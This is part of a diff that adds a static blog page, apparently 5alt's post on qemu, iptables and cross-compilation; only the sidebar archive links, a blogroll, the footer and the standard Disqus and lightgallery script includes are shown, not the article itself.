class="archive-list-link" href="/archives/2017/07/">七月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">六月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">十一月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">十月 2016</a><span class="archive-list-count">2</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    
+        
+    
+        
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">链接</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="http://5alt.me">5alt</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://mohamoha.club">么哈么哈</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.yulegeyu.com">雨了个雨</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2019 md5_salt<br>
+        </div>
+    </div>
+</footer>
+
+        
+    
+    <script>
+    var disqus_config = function () {
+        
+            this.page.url = 'http://5alt.me/2018/01/qemu、iptables和交叉编译/';
+        
+        this.page.identifier = 'qemu、iptables和交叉编译';
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://5alts-blog.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+</script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
